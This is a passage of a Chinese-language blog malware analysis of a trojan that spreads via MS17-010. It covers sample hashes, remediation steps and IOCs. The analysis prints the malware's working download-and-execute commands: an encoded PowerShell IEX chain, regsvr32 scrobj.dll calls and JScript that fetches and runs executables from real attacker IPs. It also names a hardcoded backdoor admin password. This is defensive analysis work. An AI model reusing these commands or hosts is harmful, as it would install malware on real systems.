<br>ExpMs17010在文件夹<code>PYZ-00.pyz_extracted</code>里<br><img src="/2019/02/25/木马分析-msinfo-exe/ms17010.png" alt></p><p>攻击的参数<br><img src="/2019/02/25/木马分析-msinfo-exe/modeDic.png" alt></p><h3 id="MS-17-010具体代码-ExpMs17010-py"><a href="#MS-17-010具体代码-ExpMs17010-py" class="headerlink" title="MS-17-010具体代码 ExpMs17010.py"></a>MS-17-010具体代码 ExpMs17010.py</h3><p>针对文件夹<code>PYZ-00.pyz_extracted</code>里的一堆pyc文件</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">uncompyle6</span> -o . <span class="regexp">*.pyc</span></span><br></pre></td></tr></table></figure><p>将当前文件夹中所有的pyc文件反编译成后缀名为.py的源文件</p><p>得到500多个python程序</p><p>里面主要的攻击代码是 利用 MS-17-010 永恒之蓝进行攻击<br><img src="/2019/02/25/木马分析-msinfo-exe/exp.png" alt><br>还包括了创建了一个管理员权限的 <code>admin$</code>  密码是 <code>Zxcvbnm,.1234</code> 用于控制目标主机</p><p><img src="/2019/02/25/木马分析-msinfo-exe/admin.png" alt></p><h2 id="0x04-下载恶意程序-up-rar-amp-u-exe-amp-upsnew2-exe"><a href="#0x04-下载恶意程序-up-rar-amp-u-exe-amp-upsnew2-exe" class="headerlink" title="0x04 下载恶意程序 up.rar &amp;u.exe &amp;upsnew2.exe"></a>0x04 下载恶意程序 up.rar &amp;u.exe &amp;upsnew2.exe</h2><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd <span class="string">/c</span> powershell.exe -nop -enc JAB3AGMAPQBOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ADsAJAB3AGMALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AdwBtAGkALgAxADIAMQA3AGIAeQBlAC4AaABvAHMAdAA6ADgAOAA4ADgALwAyAC4AdAB4AHQAIgApAC4AdAByAGkAbQAoACkAIAAtAHMAcABsAGkAdAAgACIAWwBcAHIAXABuAF0AKwAiAHwAJQB7ACQAbgA9ACQAXwAuAHMAcABsAGkAdAAoACIALwAiACkAWwAtADEAXQA7ACQAdwBjAC4ARABvAHcAbgBsAG8AYQBkAEYAaQBsAGUAKAAkAF8ALAAgACQAbgApADsAcwB0AGEAcgB0ACAAJABuADsAfQA=&amp;powershell.exe IEX <span class="params">(New-Object system.Net.WebClient)</span><span class="string">.DownloadString</span><span class="params">('http://wmi.1217bye.host:8888/S.ps1')</span>&amp;powershell.exe IEX <span class="params">(New-Object system.Net.WebClient)</span><span class="string">.DownloadString</span><span class="params">('http://173.208.139.170/s.txt')</span>&amp;powershell.exe IEX <span class="params">(New-Object system.Net.WebClient)</span><span class="string">.DownloadString</span><span class="params">('http://35.182.171.137/s.jpg')</span>||regsvr32 <span class="string">/u</span> <span class="string">/s</span> <span class="string">/i</span><span class="function">:http</span>:<span class="string">//wmi.1217bye.host</span><span class="function">:8888</span>/1.txt scrobj.dll&amp;regsvr32 <span class="string">/u</span> <span class="string">/s</span> <span class="string">/i</span><span class="function">:http</span>:<span class="string">//173.208.139.170/2.txt</span> scrobj.dll&amp;regsvr32 <span class="string">/u</span> <span class="string">/s</span> <span class="string">/i</span><span class="function">:http</span>:<span class="string">//35.182.171.137/3.txt</span> scrobj.dll</span><br></pre></td></tr></table></figure><p>进行base64解密<br><img src="/2019/02/25/木马分析-msinfo-exe/base64.png" alt><br><img src="/2019/02/25/木马分析-msinfo-exe/wc.png" alt><br>在分析的时候 <code>http://wmi.1217bye.host/2.txt</code> 里的内容已近被删除 404 了 </p><p>这个东西不知道干嘛的 解都解了 写上写上</p><p>csrs.exe 会从<br><code>start regsvr32 /s /u /n /i:http://173.208.172.202:8888\\s1.txt scrobj.dll</code></p><p>下下来 s1.txt 主要的IP地址 命令被16进制代替<br><img src="/2019/02/25/木马分析-msinfo-exe/s1.png" alt></p><p>解密后的s1.txt 作用是下载次一级的木马文件并实行进行 进一步的攻击</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var pYNuW1=new ActiveXObject("Microsoft.XMLHTTP");pYNuW1[<span class="string">'Open'</span>](<span class="link">"GET","http://174.128.239.250/up.rar",0</span>);pYNuW1[<span class="string">'Send'</span>](<span class="link"></span>);var U$qRso2=new ActiveXObject("ADODB.Stream");U$qRso2[<span class="string">'Open'</span>]=3;U$qRso2[<span class="string">'Type'</span>]=1;U$qRso2[<span class="string">'Open'</span>](<span class="link"></span>);U$qRso2[<span class="string">'Write'</span>](<span class="link">pYNuW1['responseBody']</span>);U$qRso2[<span class="string">'SaveToFile'</span>](<span class="link">"max.exe",2</span>);var izeadoiQ3=new ActiveXObject("WScript.Shell")[<span class="string">'Run'</span>](<span class="link">"max.exe"</span>);var pYNuW1=new ActiveXObject("Microsoft.XMLHTTP");pYNuW1[<span class="string">'Open'</span>](<span class="link">"Get","http://174.128.239.250/u.exe",0</span>);pYNuW1[<span class="string">'Send'</span>](<span class="link"></span>);var U$qRso2=new ActiveXObject("ADODB.Stream");U$qRso2[<span class="string">'Mode'</span>]=3;U$qRso2[<span class="string">'Type'</span>]=1;U$qRso2[<span class="string">'Open'</span>](<span class="link"></span>);U$qRso2[<span class="string">'Write'</span>](<span class="link">pYNuW1['responseBody']</span>);U$qRso2[<span class="string">'SaveToFile'</span>](<span class="link">"s.exe",2</span>);var izeadoiQ3=new ActiveXObject("WScript.Shell")[<span class="string">'Run'</span>](<span class="link">"s.exe"</span>);var pYNuW1=new ActiveXObject("Microsoft.XMLHTTP");pYNuW1[<span class="string">'Open'</span>](<span class="link">"GET","http://174.128.239.250/upsnew2.exe",0</span>);pYNuW1[<span class="string">'Send'</span>](<span class="link"></span>);var U$qRso2=new ActiveXObject("ADODB.Stream");U$qRso2[<span class="string">'Mode'</span>]=3;U$qRso2[<span class="string">'Type'</span>]=1;U$qRso2[<span class="string">'Open'</span>](<span class="link"></span>);U$qRso2[<span class="string">'Write'</span>](<span class="link">pYNuW1['responseBody']</span>);U$qRso2[<span class="string">'SaveToFile'</span>](<span class="link">"new.exe",2</span>);var izeadoiQ3=new ActiveXObject("WScript.Shell")[<span class="string">'Run'</span>](<span class="link">"new.exe"</span>);</span><br></pre></td></tr></table></figure><p><img src="/2019/02/25/木马分析-msinfo-exe/s1&#39;.png" alt></p><p>一共下载了三个子攻击模块</p><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span><span class="comment">//174.128.239.250/up.rar </span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//174.128.239.250/u.exe </span></span><br><span class="line"><span class="symbol">http:</span><span class="comment">//174.128.239.250/upsnew2.exe</span></span><br></pre></td></tr></table></figure><p>##0x05 up.rar 暗云木马</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">文件名称：C:<span class="symbol">\U</span>sers<span class="symbol">\R</span>onpa<span class="symbol">\D</span>esktop<span class="symbol">\m</span>od<span class="symbol">\u</span>p.rar</span><br><span class="line">文件大小：375200 字节</span><br><span class="line">文件版本：10,1,0,7671</span><br><span class="line">MD5     ：E9D6A2054408D6B50426F211FF39B9E0</span><br><span class="line">SHA1    ：3C402DE61EDAF43C380D05CD1A0FA1D99106096C</span><br><span class="line">CRC32   ：ACDFA9B9</span><br></pre></td></tr></table></figure><p>不会 看参考博客说是 暗云III 远控木马 解压之后没有可执行文件 不知道怎么分析</p><p>##0x06 u.exe DNS劫持 Mirai木马</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">文件名称：C:<span class="symbol">\U</span>sers<span class="symbol">\R</span>onpa<span class="symbol">\D</span>esktop<span class="symbol">\m</span>od<span class="symbol">\u</span>.exe</span><br><span class="line">文件大小：90112 字节</span><br><span class="line">文件版本：1.0.0.1</span><br><span class="line">MD5     ：339E5B6DBDC0E36D07EE5B665284B72A</span><br><span class="line">SHA1    ：297377EB5FB956A3C641C80C7BBD51133327C9EF</span><br><span class="line">CRC32   ：8AE64FF9</span><br></pre></td></tr></table></figure><p>加了简单的UPX压缩壳</p><h3 id="简析"><a href="#简析" class="headerlink" title="简析"></a>简析</h3><p>主函数:<br><img src="/2019/02/25/木马分析-msinfo-exe/main.png" alt><br>第三个函数会将DNS设置更改为<code>223.5.5.5,8.8.8.8</code><br><br>具体代码:<br><img src="/2019/02/25/木马分析-msinfo-exe/change.png" alt><br><img src="/2019/02/25/木马分析-msinfo-exe/change2.png" alt></p><p>##0x07 upsnew2.exe 开启危险服务&amp;下载挖矿程序</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">文件名称：C:<span class="symbol">\U</span>sers<span class="symbol">\R</span>onpa<span class="symbol">\D</span>esktop<span class="symbol">\m</span>od<span class="symbol">\u</span>psnew2.exe</span><br><span class="line">文件大小：2007552 字节</span><br><span class="line">文件版本：1.0.0.8</span><br><span class="line">MD5     ：DE9ACA5D083B7A6D796783C2318B7083</span><br><span class="line">SHA1    ：1347AB488C847B66DF049E630F4E98B49C2BA3A6</span><br><span class="line">CRC32   ：5E9995CF</span><br></pre></td></tr></table></figure><p>加了简单的UPX压缩壳<br>Upsnew2释放远控木马item.dat以及c3.bat脚本</p><p>远控木马我透 又有壳 我好菜啊 不会脱 放弃 好像是易语言自带的压缩壳</p><h2 id="0×08-解决方案"><a href="#0×08-解决方案" class="headerlink" title="0×08 解决方案"></a>0×08 解决方案</h2><ol><li>隔离被感染主机 断网 防止病毒进一步扩散</li><li>漏洞补丁 打上MS-17-010的漏洞补丁 防止病毒再次使用漏洞进行攻击扩散</li><li>使用杀毒软件删除病毒文件 和结束可疑进程 升级病毒库</li><li>关闭445端口等脆弱的端口</li><li>加强防护 和人员安全意识教育 安装防火墙 不点击可疑文件</li><li>关闭封杀病毒的云端 禁止电脑访问病毒里的URL</li></ol><h2 id="0×09-IOC"><a href="#0×09-IOC" class="headerlink" title="0×09 IOC"></a>0×09 IOC</h2><p>IP：</p><p>45.58.135.106</p><p>103.213.246.23</p><p>18.218.14.96</p><p>74.222.14.61</p><p>78.142.29.152</p><p>URL：</p><p><a href="http://wmi.1217bye.host/S.ps1\" target="_blank" rel="noopener">http://wmi.1217bye.host/S.ps1\</a></p><p><a href="http://173.208.139.170/s.txt\" target="_blank" rel="noopener">http://173.208.139.170/s.txt\</a></p><p><a href="http://35.182.171.137/s.jpg" target="_blank" rel="noopener">http://35.182.171.137/s.jpg</a></p><p><a href="http://wmi.1217bye.host:8888/1.txt" target="_blank" rel="noopener">http://wmi.1217bye.host:8888/1.txt</a></p><p><a href="http://173.208.139.170/2.txt" target="_blank" rel="noopener">http://173.208.139.170/2.txt</a></p><p><a href="http://35.182.171.137/3.txt" target="_blank" rel="noopener">http://35.182.171.137/3.txt</a></p><p><a href="http://173.208.172.202:8888\\s1.txt" target="_blank" rel="noopener">http://173.208.172.202:8888\\s1.txt</a></p><p><a href="http://wmi.1217bye.host:8888/S.ps1" target="_blank" rel="noopener">http://wmi.1217bye.host:8888/S.ps1</a></p><p><a href="http://174.128.239.250/up.rar" target="_blank" rel="noopener">http://174.128.239.250/up.rar</a> </p><p><a href="http://174.128.239.250/u.exe" target="_blank" rel="noopener">http://174.128.239.250/u.exe</a> </p><p><a href="http://174.128.239.250/upsnew2.exe" target="_blank" rel="noopener">http://174.128.239.250/upsnew2.exe</a></p><p>域名：</p><p>mymyxmra.ru</p><p>ok.mymyxmra.ru </p><h2 id="0x08-参考"><a href="#0x08-参考" class="headerlink" title="0x08 参考"></a>0x08 参考</h2><p><a href="https://www.freebuf.com/vuls/194515.html" target="_blank" rel="noopener">暗云III v3.0 、Mykings、Mirai多个病毒家族结伴来袭的实战分析</a><br><br><a href="http://www.4hou.com/technology/3468.html" target="_blank" rel="noopener">Mirai物联网僵尸攻击竟然可以在Linux平台和Windows平台之间交叉传播</a><br><br><a href="https://www.freebuf.com/articles/terminal/191303.html" target="_blank" rel="noopener">具备多病毒功能！MiraiXMiner物联网僵尸网络攻击来袭</a></p><h2 id="0x09-结语"><a href="#0x09-结语" class="headerlink" title="0x09 结语"></a>0x09 结语</h2><p>之分析了一半<br>主程序其实还自带扫描器和感染功能 但因为我破不开壳 所以无法进一步分析</p><p>只能退而去分析 它从云端上下下来的攻击模块</p><p>最后的三个模块也粗粗分析了 一个DNS劫持的模块<br>剩余的两个纯粹是因为实力不足 我好菜啊</p><p>这次经历让我知道了工作中会遇到的东西其实和比赛上遇到的完全不一样<br>光从对壳的重视程度上就能知道</p><p>手脱 基本功 我不行 菜狗黄培桁</p><p>还有 这个病毒简直是个大杂烩啥都有</p><p>哦对了 写这个病毒的估计是个国人 他在代码里给我送上一句最真诚的国骂23333333 笑死我了</p><p><img src="/2019/02/25/木马分析-msinfo-exe/cnm.png" alt></p>]]></content>
    
    
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;给了两个木马文件 分别是 down.exe和 msinfo.exe&lt;br&gt;打算先从没加壳的 down.exe开始分析&lt;br&gt;后来发现不是没加壳 而是查不出 VC7++ OEP的机器码根本不对 查了一下 大概需要手动补充&lt;br&gt;最后发现 两个其实是同一个病毒产生的两个程序&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="Malware" scheme="http://Ronpa.top/tags/Malware/"/>
    
  </entry>
  
</feed>
